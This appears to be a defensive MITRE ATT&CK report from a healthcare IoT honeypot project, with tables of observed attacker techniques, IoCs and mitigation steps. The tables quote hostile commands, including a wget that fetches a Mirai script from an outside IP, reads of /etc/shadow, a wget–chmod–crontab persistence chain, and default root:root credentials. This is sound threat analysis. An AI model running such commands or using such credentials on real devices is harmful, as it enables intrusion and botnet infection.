# MITRE ATT&CK Analysis Report
**Project:** Healthcare IoT Deception Honeypot Network
**Week 4 — Threat Intelligence & Attack Pattern Analysis**

## Overview
This report maps observed attacker behavior from the Cowrie honeypot
to the MITRE ATT&CK framework for Enterprise and ICS (Industrial
Control Systems) — relevant for medical IoT environments.

## Attack Kill Chain

## Detailed TTP Mapping

### TA0001 — Initial Access
| Technique | ID | Evidence |
|-----------|-----|---------|
| Brute Force: Password Spraying | T1110.003 | 5+ failed logins before success |
| Valid Accounts: Default Accounts | T1078.001 | root/root credential success |

### TA0002 — Execution
| Technique | ID | Evidence |
|-----------|-----|---------|
| Command and Scripting Interpreter: Unix Shell | T1059.004 | Shell commands post-login |
| Native API | T1106 | Direct system calls via shell |

### TA0003 — Persistence
| Technique | ID | Evidence |
|-----------|-----|---------|
| Scheduled Task/Job: Cron | T1053.003 | crontab -l command observed |
| SSH Authorized Keys | T1098.004 | Attempted key injection |

### TA0005 — Defense Evasion
| Technique | ID | Evidence |
|-----------|-----|---------|
| File and Directory Permissions Modification | T1222 | chmod +x commands |
| Clear Linux or Mac System Logs | T1070.002 | Attempted log deletion |

### TA0006 — Credential Access
| Technique | ID | Evidence |
|-----------|-----|---------|
| OS Credential Dumping | T1003 | cat /etc/passwd, /etc/shadow |
| Brute Force | T1110 | Multiple password attempts |

### TA0007 — Discovery
| Technique | ID | Evidence |
|-----------|-----|---------|
| System Information Discovery | T1082 | uname -a, cat /proc/cpuinfo |
| Process Discovery | T1057 | ps aux command |
| Network Service Discovery | T1046 | netstat -an command |
| System Network Configuration | T1016 | ifconfig, netstat |

### TA0011 — Command and Control
| Technique | ID | Evidence |
|-----------|-----|---------|
| Ingress Tool Transfer | T1105 | wget http://185.220.101.45/mirai.sh |
| Application Layer Protocol | T1071 | HTTP-based C2 communication |

### TA0010 — Exfiltration
| Technique | ID | Evidence |
|-----------|-----|---------|
| Archive Collected Data | T1560 | tar -czf attempted |
| Exfiltration Over C2 Channel | T1041 | nc (netcat) usage |

## IoC Summary
| Type | Indicator | Confidence |
|------|-----------|-----------|
| IP | 172.20.0.1 (lab) | HIGH |
| URL | http://185.220.101.45/mirai.sh | HIGH |
| Command | wget \| chmod +x \| crontab | HIGH |
| Credential | root:root, admin:admin | HIGH |

## Healthcare-Specific Risk
Medical IoT devices running default SSH credentials represent
a CRITICAL risk under HIPAA §164.312(a)(1) Access Control.
The observed attack pattern is consistent with Mirai botnet
variants that specifically target medical device gateways.

## Recommendations
1. **Immediate:** Disable SSH on all medical IoT devices
2. **Short-term:** Implement certificate-based authentication
3. **Medium-term:** Deploy network segmentation (VLAN isolation)
4. **Long-term:** Establish continuous monitoring with SIEM integration
